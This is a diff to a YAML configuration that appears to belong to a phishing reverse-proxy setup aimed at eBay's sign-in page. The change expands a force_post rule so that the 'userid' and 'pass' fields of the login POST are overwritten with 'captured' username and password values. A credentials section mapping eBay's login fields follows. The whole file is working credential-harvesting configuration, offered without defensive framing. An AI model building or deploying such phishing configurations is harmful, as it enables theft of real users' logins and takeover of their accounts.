@@ -158,9 +158,14 @@ force_post:
     path: '/ws/eBayISAPI.dll?SignIn'
     type: post
     force:
-      key: 'userid'              # Field name to enforce in the POST data
-      search: '.*'               # Regex pattern to match any value in the 'userid' field
-      replace: '{{credentials.username}}'  # Replace with captured username
+      - key: 'userid'                     # Field name to enforce in the POST data
+        search: '.*'                      # Regex pattern to match any value in the 'userid' field
+        replace: '{{credentials.username}}' # Replace with captured username
+        value: '{{credentials.username}}'   # Set the replacement value for 'userid'
+      - key: 'pass'                       # Field name to enforce in the POST data
+        search: '.*'                      # Regex pattern to match any value in the 'pass' field
+        replace: '{{credentials.password}}' # Replace with captured password
+        value: '{{credentials.password}}'   # Set the replacement value for 'pass'
     headers:
       Content-Type: 'application/x-www-form-urlencoded'
       User-Agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
@@ -176,6 +181,7 @@ force_post:
     body:
       - { key: 'userid', value: '{{credentials.username}}' }
       - { key: 'pass', value: '{{credentials.password}}' }
+
 credentials:
   username:
     key: 'userid'         # The name of the email/username field on eBay login
